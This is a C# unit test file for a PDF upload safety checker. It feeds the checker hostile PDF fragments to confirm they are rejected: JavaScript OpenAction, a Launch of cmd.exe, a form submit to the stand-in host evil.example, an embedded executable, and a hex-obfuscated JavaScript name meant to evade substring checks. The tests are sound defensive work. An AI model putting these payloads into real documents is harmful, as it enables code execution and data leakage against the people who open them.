using Fiit.Api.Services;
using PdfSharp.Pdf;

namespace Fiit.Api.Tests.Unit;

public class PdfSafetyTests
{
    [Fact]
    public void Plain_pdf_is_ok() => Assert.Equal(PdfVerdict.Ok, PdfSafety.Check(TestPdf.Create(3)).Verdict);

    [Fact]
    public void Hand_made_pdf_is_ok() => Assert.Equal(PdfVerdict.Ok, PdfSafety.Check(TestPdf.Raw("")).Verdict);

    [Fact]
    public void Link_to_web_page_is_ok() =>
        Assert.Equal(PdfVerdict.Ok, PdfSafety.Check(TestPdf.Raw("/OpenAction << /S /URI /URI (https://example.com) >>")).Verdict);

    [Theory]
    [InlineData("%PDF-1.7\nэто не pdf")]
    [InlineData("<html><script>alert(1)</script></html>")]
    [InlineData("")]
    public void Garbage_is_invalid(string content) =>
        Assert.Equal(PdfVerdict.Invalid, PdfSafety.Check(System.Text.Encoding.UTF8.GetBytes(content)).Verdict);

    [Theory]
    [InlineData("/OpenAction << /S /JavaScript /JS (app.alert(1)) >>")]
    [InlineData("/OpenAction << /S /Launch /F (cmd.exe) >>")]
    [InlineData("/AA << /O << /S /SubmitForm /F (https://evil.example) >> >>")]
    [InlineData("/Names << /EmbeddedFiles << /Names [(a.exe) << /Type /Filespec /F (a.exe) >>] >> >>")]
    [InlineData("/AcroForm << /XFA [] /Fields [] >>")]
    public void Active_content_is_rejected(string catalogExtra)
    {
        var check = PdfSafety.Check(TestPdf.Raw(catalogExtra));
        Assert.Equal(PdfVerdict.ActiveContent, check.Verdict);
    }

    [Fact]
    public void Obfuscated_name_is_still_found() =>
        // #4A = J, #61 = a: «/J#61vaScript» — классический обход поиска по подстроке
        Assert.Equal(PdfVerdict.ActiveContent, PdfSafety.Check(TestPdf.Raw("/OpenAction << /S /J#61vaScript /#4AS (app.alert(1)) >>")).Verdict);

    [Fact]
    public void Script_in_separate_object_is_found()
    {
        var pdf = TestPdf.Create(configure: doc =>
        {
            var action = new PdfDictionary(doc);
            action.Elements.SetName("/S", "/JavaScript");
            action.Elements.SetString("/JS", "app.alert(1)");
            doc.Internals.AddObject(action);
            doc.Internals.Catalog.Elements.SetReference("/OpenAction", action);
        });
        Assert.Equal(PdfVerdict.ActiveContent, PdfSafety.Check(pdf).Verdict);
    }

    [Fact]
    public void Password_protected_pdf_is_rejected()
    {
        var pdf = TestPdf.Create(configure: doc => doc.SecuritySettings.UserPassword = "secret");
        Assert.Equal(PdfVerdict.Encrypted, PdfSafety.Check(pdf).Verdict);
    }

    [Fact]
    public void Owner_password_only_is_rejected()
    {
        var pdf = TestPdf.Create(configure: doc => doc.SecuritySettings.OwnerPassword = "owner");
        Assert.Equal(PdfVerdict.Encrypted, PdfSafety.Check(pdf).Verdict);
    }

    [Fact]
    public void Too_many_pages_is_rejected() =>
        Assert.Equal(PdfVerdict.TooManyPages, PdfSafety.Check(TestPdf.Create(PdfSafety.MaxPages + 1)).Verdict);
}
